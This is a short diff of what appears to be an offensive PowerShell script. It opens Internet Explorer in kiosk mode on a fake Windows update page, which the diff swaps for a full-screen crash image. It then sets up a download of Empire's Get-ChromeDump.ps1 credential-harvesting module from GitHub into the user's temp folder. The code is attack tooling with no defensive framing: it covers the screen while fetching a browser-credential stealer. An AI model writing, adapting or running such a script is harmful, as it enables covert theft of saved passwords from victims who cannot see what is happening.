@@ -1,4 +1,4 @@
-start-job -scriptblock {C:\Progra~1\Intern~1\iexplore.exe -k https://fakeupdate.net/win10ue/index.html} 1>$null
+start-job -scriptblock {C:\Progra~1\Intern~1\iexplore.exe -k https://upload.wikimedia.org/wikipedia/commons/e/e0/Win3x_Black_Screen_of_Death.gif/index.html} 1>$null
 $url = "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1"
 $output = "$env:temp\file.psm1"
 
